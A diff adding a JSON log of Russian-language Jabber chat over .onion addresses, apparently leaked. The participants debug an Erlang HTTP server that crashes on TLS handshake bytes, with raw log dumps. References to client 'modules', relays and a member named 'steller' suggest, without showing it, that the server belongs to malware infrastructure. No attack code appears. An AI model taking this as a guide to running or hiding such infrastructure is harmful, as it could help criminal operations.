@@ -1,0 +1,3107 @@
+{
+    "2021-08-27T10:23:28.267837": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "defender@q3mcco35auwcstmt.onion/Psi+ приглашает вас в комнату ttrr@conference.q3mcco35auwcstmt.onion"
+    },
+    "2021-08-27T10:24:52.840285": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "defender@q3mcco35auwcstmt.onion/Psi+ приглашает вас в комнату ttrr@conference.q3mcco35auwcstmt.onion"
+    },
+    "2021-08-27T10:25:59.986038": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "тута"
+    },
+    "2021-08-27T10:25:59.986515": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "ждем остальных"
+    },
+    "2021-08-27T10:25:59.987382": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "ок"
+    },
+    "2021-08-27T10:26:04.830105": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "body": "хай"
+    },
+    "2021-08-27T10:26:04.831426": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "хай"
+    },
+    "2021-08-27T10:26:17.234573": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "body": "я пароль не ставил на вход в конфу, это приемлемо?"
+    },
+    "2021-08-27T10:26:17.235232": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "я пароль не ставил на вход в конфу, это приемлемо?"
+    },
+    "2021-08-27T10:27:43.437940": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "это только для зарегистрированных участников"
+    },
+    "2021-08-27T10:27:48.741742": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "других тут не может быть"
+    },
+    "2021-08-27T10:28:03.704726": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "хоф остался"
+    },
+    "2021-08-27T10:30:23.085238": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "на месте"
+    },
+    "2021-08-27T10:30:28.882477": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "привет"
+    },
+    "2021-08-27T10:34:32.662119": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "короче . проблема в хттп в том . что клиент обрывает коннект раньше, чем передает данные . а именно я грешу на то, что клиент не передает самый последний перевод строки"
+    },
+    "2021-08-27T10:35:13.159029": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "от этого возникает краш на моей стороне и я не могу обработать запрос"
+    },
+    "2021-08-27T10:35:33.426058": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "body": "в http есть три способа получить флаг конца передачи"
+    },
+    "2021-08-27T10:35:33.428199": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "в http есть три способа получить флаг конца передачи"
+    },
+    "2021-08-27T10:35:41.723544": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "body": "1. Content-Length"
+    },
+    "2021-08-27T10:35:41.727078": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "1. Content-Length"
+    },
+    "2021-08-27T10:35:47.128748": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "body": "2. Connection: close"
+    },
+    "2021-08-27T10:35:47.131450": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "2. Connection: close"
+    },
+    "2021-08-27T10:36:04.112043": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "body": "3. Content-Encoding: chunked и дальше отслеживается цепочка чанков"
+    },
+    "2021-08-27T10:36:04.114815": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "3. Content-Encoding: chunked и дальше отслеживается цепочка чанков"
+    },
+    "2021-08-27T10:36:15.501318": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "body": "клиент о котором ты говоришь какой метод использует?"
+    },
+    "2021-08-27T10:36:15.503688": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "клиент о котором ты говоришь какой метод использует?"
+    },
+    "2021-08-27T10:36:21.261721": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "body": "ты сам какой метод форсируешь на сервере?"
+    },
+    "2021-08-27T10:36:21.264539": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "ты сам какой метод форсируешь на сервере?"
+    },
+    "2021-08-27T10:36:59.316439": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "body": "defender добавь сюда flip и steller"
+    },
+    "2021-08-27T10:36:59.318926": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "defender добавь сюда flip и steller"
+    },
+    "2021-08-27T10:37:09.754602": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "да  я никакой не форсирую .есть либа . которая занимается хтпп .. она парсит и разбирает всё .. я лишь её вызываю . \nпричем сделано это так .. что сначала работает она .. а потом уже я .. т.о. я не имею доступа напрямую к бинарному потоку данных"
+    },
+    "2021-08-27T10:37:22.166772": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "body": "так вот разберись"
+    },
+    "2021-08-27T10:37:22.168826": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "так вот разберись"
+    },
+    "2021-08-27T10:37:36.831821": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "body": "у клиентов есть причина использовать наиболее простой метод"
+    },
+    "2021-08-27T10:37:36.834026": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "у клиентов есть причина использовать наиболее простой метод"
+    },
+    "2021-08-27T10:37:55.059418": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "причина есть .если эта причина удовлетворяет спеицификациям хттп .."
+    },
+    "2021-08-27T10:37:55.375276": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "body": "например им сложно использовать chunked-передачу"
+    },
+    "2021-08-27T10:37:55.376651": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "например им сложно использовать chunked-передачу"
+    },
+    "2021-08-27T10:38:34.863809": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "body": "и они скорее всего используют connection: close, то есть сигнал о конце передачи приходит с закрытием сокета"
+    },
+    "2021-08-27T10:38:34.865831": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "и они скорее всего используют connection: close, то есть сигнал о конце передачи приходит с закрытием сокета"
+    },
+    "2021-08-27T10:38:38.660945": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "если либа падает - это значит что клиент отправляет не то что ожидает эта либа . т.е. не хттп"
+    },
+    "2021-08-27T10:39:02.445462": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "body": "ты должен дать требования тем кто пишет клиенты, что эта либа умеет, а чего не умеет"
+    },
+    "2021-08-27T10:39:02.448656": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "ты должен дать требования тем кто пишет клиенты, что эта либа умеет, а чего не умеет"
+    },
+    "2021-08-27T10:39:06.118329": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "либа ожидает на входе (бинарном) данные, но бинарный вход пуст .. вот парсер хттп и ломается"
+    },
+    "2021-08-27T10:39:17.550442": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "она умеет всё"
+    },
+    "2021-08-27T10:39:26.512879": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "body": "как видим не всё"
+    },
+    "2021-08-27T10:39:26.514058": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "как видим не всё"
+    },
+    "2021-08-27T10:39:29.429924": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "это промышленное решение .. и её пользуются очень многие"
+    },
+    "2021-08-27T10:39:40.113760": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "body": "давай на примерах"
+    },
+    "2021-08-27T10:39:40.115845": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "давай на примерах"
+    },
+    "2021-08-27T10:39:46.364690": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "примерах что ?"
+    },
+    "2021-08-27T10:39:51.187334": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "body": "кривой посылки"
+    },
+    "2021-08-27T10:39:51.191023": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "кривой посылки"
+    },
+    "2021-08-27T10:40:03.663968": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "body": "выложи сюда кривую посылку со стороны модуля и скажи что в ней криво"
+    },
+    "2021-08-27T10:40:03.665620": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "выложи сюда кривую посылку со стороны модуля и скажи что в ней криво"
+    },
+    "2021-08-27T10:40:15.077900": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "еще раз . у меня нет доступа к бинарному потоку .."
+    },
+    "2021-08-27T10:40:19.331153": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "либа от меня это скрывает"
+    },
+    "2021-08-27T10:40:31.497173": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "body": "ну HTTP-запрос ты же можешь перехватить?"
+    },
+    "2021-08-27T10:40:31.498684": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "ну HTTP-запрос ты же можешь перехватить?"
+    },
+    "2021-08-27T10:40:39.255519": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "я лишь могу по ошибке сказать где сломалось у неё и я вижу что она ожидает данные - но данных нет"
+    },
+    "2021-08-27T10:40:52.885162": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "body": "то есть ты даже не видишь сырые HTTP"
+    },
+    "2021-08-27T10:40:52.889084": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "то есть ты даже не видишь сырые HTTP"
+    },
+    "2021-08-27T10:40:58.709751": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "нет"
+    },
+    "2021-08-27T10:41:03.477069": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "только через прокси какой могу"
+    },
+    "2021-08-27T10:41:07.271519": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "body": "поставь mitmproxy"
+    },
+    "2021-08-27T10:41:07.275909": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "поставь mitmproxy"
+    },
+    "2021-08-27T10:41:18.237446": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "body": "как можно отлаживать такую сложную систему наощупь?"
+    },
+    "2021-08-27T10:41:18.240705": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "как можно отлаживать такую сложную систему наощупь?"
+    },
+    "2021-08-27T10:41:18.451074": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "ну или логи сделать внутри либы"
+    },
+    "2021-08-27T10:41:22.816407": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "это уже по живому надо"
+    },
+    "2021-08-27T10:41:51.571245": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "body": "и флип и стеллер могут предъявить запросы HTTP которые они генерируют, и могут попытаться их исправить в соответствии с твоими указаниями"
+    },
+    "2021-08-27T10:41:51.573122": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "и флип и стеллер могут предъявить запросы HTTP которые они генерируют, и могут попытаться их исправить в соответствии с твоими указаниями"
+    },
+    "2021-08-27T10:42:05.075063": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "в общем давай я посмотрю тогда бинарный поток . лог сделаю на живом сервере .."
+    },
+    "2021-08-27T10:42:05.581165": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "body": "тебе лишь надо сказать где ошибка, по твоей версии"
+    },
+    "2021-08-27T10:42:05.582298": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "тебе лишь надо сказать где ошибка, по твоей версии"
+    },
+    "2021-08-27T10:42:08.864149": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "может убрать либу? получать данные с сокета?"
+    },
+    "2021-08-27T10:42:10.027592": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "они тоже могут дать пример потока"
+    },
+    "2021-08-27T10:42:18.328249": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "парсить хттп сам будешь ?"
+    },
+    "2021-08-27T10:42:39.087328": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "body": "@zulas так тут же важно именно сравнить то, что они отправляют, с тем, что ты принимаешь"
+    },
+    "2021-08-27T10:42:39.089012": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "@zulas так тут же важно именно сравнить то, что они отправляют, с тем, что ты принимаешь"
+    },
+    "2021-08-27T10:42:43.638886": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "мне щас надо на часок отлучится .. приду - сделаю - посмотрю"
+    },
+    "2021-08-27T10:42:44.192351": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "body": "очень далеко не факт что это одно и то же"
+    },
+    "2021-08-27T10:42:44.193075": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "очень далеко не факт что это одно и то же"
+    },
+    "2021-08-27T10:42:44.437845": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "ну а какой выход?"
+    },
+    "2021-08-27T10:42:52.129081": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "body": "уже не раз так было"
+    },
+    "2021-08-27T10:42:52.130771": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "уже не раз так было"
+    },
+    "2021-08-27T10:42:54.116230": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "выход - разбираться"
+    },
+    "2021-08-27T10:42:55.649371": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "body": "по пути у нас прокладки"
+    },
+    "2021-08-27T10:42:55.654050": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "по пути у нас прокладки"
+    },
+    "2021-08-27T10:42:59.527892": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "body": "и наши, и чужие"
+    },
+    "2021-08-27T10:42:59.529083": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "и наши, и чужие"
+    },
+    "2021-08-27T10:43:06.781641": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "body": "они жонглируют заголовками"
+    },
+    "2021-08-27T10:43:06.786796": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "они жонглируют заголовками"
+    },
+    "2021-08-27T10:43:16.159578": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "body": "они имеют право перекодировать пакеты"
+    },
+    "2021-08-27T10:43:16.180760": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "они имеют право перекодировать пакеты"
+    },
+    "2021-08-27T10:43:18.436074": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "отошел"
+    },
+    "2021-08-27T12:29:10.137490": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "я на живом сейчас экспериментирую"
+    },
+    "2021-08-27T12:49:43.333972": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "2021-08-27 15:43:18.250 [info] <0.173.0> Data: <<22,3,1,0,122,1,0,0,118,3,1,97,40,221,230,188,215,55,88,76,161,53,70,161,100,228,44,187,170,189,227,118,111,91,127,244,240,143,161,47,114,14,107,0,0,14,192,10,192,9,192,20,192,19,0,53,0,47,0,10,1,0,0,63,0,0,0,28,0,26,0,0,23,116,114,97,99,107,46,97,110,97,108,121,116,105,99,115,45,100,97,116,97,46,105,111,0,10,0,8,0,6,0,29,0,23,0,24,0,11,0,2,1,0,0,35,0,0,0,23,0,0,255,1,0,1,0>> \n2021-08-27 15:43:18.251 [error] emulator Error in process <0.173.0> on node dero_server@server with exit value:\n2021-08-27 15:43:18.251 [error] <0.173.0>@cowboy_protocol:parse_method:169 Ranch listener http terminated with reason: no function clause matching cowboy_protocol:parse_method(<<>>, {state,#Port<0.4001>,ranch_tcp,[cowboy_router,cowboy_handler],false,[{listener,http},{dispatch,[...]}],...}, <<22,3,1,0,122,1,0,0,118,3,1,97,40,221,230,188,215,55,88,76,161,53,70,161,100,228,44,187,170,189,...>>) line 169\n\nвот из лога бинарный поток"
+    },
+    "2021-08-27T12:49:51.524311": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "который вызывает проблему"
+    },
+    "2021-08-27T12:50:38.329503": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "а вот это:\n\n2021-08-27 15:43:18.007 [info] <0.158.0> Data: <<22,3,1,2,0,1,0,1,252,3,3,85,217,147,101,152,84,237,168,57,127,64,130,166,246,5,28,145,200,82,174,223,48,129,23,230,170,167,24,30,118,147,105,32,112,120,62,28,164,221,67,133,188,32,79,97,132,30,48,15,140,239,224,165,168,5,1,6,12,28,143,159,175,32,133,143,0,54,218,218,19,1,19,2,19,3,192,44,192,43,204,169,192,48,192,47,204,168,192,36,192,35,192,10,192,9,192,40,192,39,192,20,192,19,0,157,0,156,0,61,0,60,0,53,0,47,192,8,192,18,0,10,1,0,1,125,234,234,0,0,0,0,0,23,0,21,0,0,18,103,97,116,101,119,97,121,46,105,99,108,111,117,100,46,99,111,109,0,23,0,0,255,1,0,1,0,0,10,0,12,0,10,202,202,0,29,0,23,0,24,0,25,0,11,0,2,1,0,0,16,0,14,0,12,2,104,50,8,104,116,116,112,47,49,46,49,0,5,0,5,1,0,0,0,0,0,13,0,24,0,22,4,3,8,4,4,1,5,3,2,3,8,5,8,5,5,1,8,6,6,1,2,1,0,18,0,0,0,51,0,43,0,41,202,202,0,1,0,0,29,0,32,233,161,223,78,0,73,53,96,119,159,215,212,71,216,72,236,103,226,140,165,145,139,122,217,41,240,23,248,115,130,152,66,0,45,0,2,1,1,0,43,0,11,10,154,154,3,4,3,3,3,2,3,1,250,250,0,1,0,0,21,0,183,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,...>>\n State: {state,#Port<0.3896>,ranch_tcp,[cowboy_router,cowboy_handler],false,[{listener,http},{dispatch,[{'_',[],[{['...'],[],http_handler,[{limits,32768,1024,4096,102400,8529920,8388608,1024}]}]}]}],undefined,undefined,5,1,100,4096,64,4096,100,5000,1630068203006}\n ReqEmpty 0\n\nпроблемы не вызывает"
+    },
+    "2021-08-27T12:51:26.604074": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "или вот это:\n\n\n2021-08-27 15:43:18.064 [info] <0.162.0> Data: <<22,3,1,2,0,1,0,1,252,3,3,14,44,33,56,26,185,206,231,236,178,193,16,165,188,27,22,214,160,174,190,146,134,183,85,117,16,235,49,77,234,9,129,32,12,245,86,126,154,166,11,108,160,171,200,195,227,185,95,124,147,27,250,187,108,120,82,136,198,154,167,107,53,75,254,175,0,32,250,250,19,3,19,1,19,2,204,169,204,168,192,43,192,47,192,44,192,48,192,19,192,20,0,156,0,157,0,47,0,53,1,0,1,147,138,138,0,0,0,0,0,20,0,18,0,0,15,109,97,105,108,46,103,111,111,103,108,101,46,99,111,109,0,23,0,0,255,1,0,1,0,0,10,0,10,0,8,202,202,0,29,0,23,0,24,0,11,0,2,1,0,0,35,0,0,0,16,0,14,0,12,2,104,50,8,104,116,116,112,47,49,46,49,0,5,0,5,1,0,0,0,0,0,13,0,18,0,16,4,3,8,4,4,1,5,3,8,5,5,1,8,6,6,1,0,18,0,0,0,51,0,43,0,41,202,202,0,1,0,0,29,0,32,18,248,125,69,188,229,9,34,184,87,206,13,209,25,177,114,240,187,218,2,250,42,123,238,190,210,236,200,51,78,3,30,0,45,0,2,1,1,0,43,0,11,10,42,42,3,4,3,3,3,2,3,1,0,27,0,3,2,0,2,68,105,0,5,0,3,2,104,50,170,170,0,1,0,0,21,0,196,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0>>"
+    },
+    "2021-08-27T12:54:00.998917": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "@defender если очень надо то я могу перехватывать такой краш - и не показывать его."
+    },
+    "2021-08-27T12:55:03.822195": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "body": "ничего не понятно"
+    },
+    "2021-08-27T12:55:03.823113": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "ничего не понятно"
+    },
+    "2021-08-27T12:55:15.832458": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "body": "как это соотносится с HTTP-запросом? какая это его часть?"
+    },
+    "2021-08-27T12:55:15.833973": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "как это соотносится с HTTP-запросом? какая это его часть?"
+    },
+    "2021-08-27T12:55:54.277393": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "body": "это после распаковки из контейнера multipart/form-data? или это данные вместе с контейнером?"
+    },
+    "2021-08-27T12:55:54.278885": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "это после распаковки из контейнера multipart/form-data? или это данные вместе с контейнером?"
+    },
+    "2021-08-27T12:56:03.728703": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "body": "или там вообще нет контейнера?"
+    },
+    "2021-08-27T12:56:03.729537": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "или там вообще нет контейнера?"
+    },
+    "2021-08-27T12:57:49.424858": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "body": "сними соответствующие HTTP-запросы, поставь прокси перед сервером"
